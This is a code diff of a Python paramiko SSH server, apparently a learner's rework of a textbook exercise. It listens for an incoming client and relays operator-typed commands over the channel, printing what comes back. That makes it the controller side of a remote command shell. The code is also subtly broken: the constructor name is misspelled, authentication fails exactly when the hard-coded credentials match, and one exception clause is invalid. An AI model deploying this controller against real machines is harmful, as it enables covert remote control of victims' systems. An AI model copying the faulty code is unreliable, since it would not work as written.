@@ -5,30 +5,41 @@ import sys
 
 # using the key from paramiko demo files
 
-host_key = paramiko.RSAKey(filename=rsa.key) # location of RSA public key
+host_key = paramiko.RSAKey(filename='keys/rsa_sha256.pub') # location of RSA public key
 
 class Server (paramiko.ServerInterface):
     def _init_(self):
         self.event = threading.Event()
-        def check_channel_request(self, kind, chanid):
-            if kind == 'session':
-                return paramiko.OPEN_SUCCEEDED
-            return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
-        def check_auth_password(self, username, password):
-            if (username == 'user') and (password == 'passwd'):
-                return paramiko.AUTH_FAILED
-            
+
+    # check the kind of channel opened by paramiko transport
+    def check_channel_request(self, kind, chanid):
+        if kind == 'session':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+    # simple password check    
+    def check_auth_password(self, username, password):
+        if (username == 'userA') and (password == 'passwd'):
+            return paramiko.AUTH_FAILED
+
+# incorportate CLI arguments            
 server = sys.argv[1]
 ssh_port = int(sys.argv[2])
 
+# try to listen for an incoming connection
 try:
+    # create socket stream with following options
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    # bind the socket to the CLI arguments
     sock.bind((server, ssh_port))
+
+    # listen for a connection with a backlog of 100
     sock.listen(100)
     print('[+] Listening for connection... ')
     client, addr = sock.accept()
-except Exception(e):
+except Exception as e:
     print('[-] Listen failed: ' + str(e))
     sys.exit(1)
 
@@ -37,10 +48,10 @@ print('[+] Got a connection!')
 try:
     bhSession = paramiko.Transport(client)
     bhSession.add_server_key(host_key)
-    server = bhSession.accept(20)
+    server = Server()
     try:
         bhSession.start_server(server=server)
-    except paramiko.SSHException(x):
+    except paramiko.SSHException() as x:
         print('[-] SSH negotiation failed.')
     chan = bhSession.accept(20)
     print('[+] Authenticated!')
@@ -48,7 +59,7 @@ try:
     chan.send('Welcome to bh_ssh')
     while True:
         try:
-            command = raw_input("Enter command: ").strip('\n')
+            command = input("Enter command: ").strip('\n')
             if command != 'exit':
                 chan.send(command)
                 print(chan.recv(1024) + '\n')
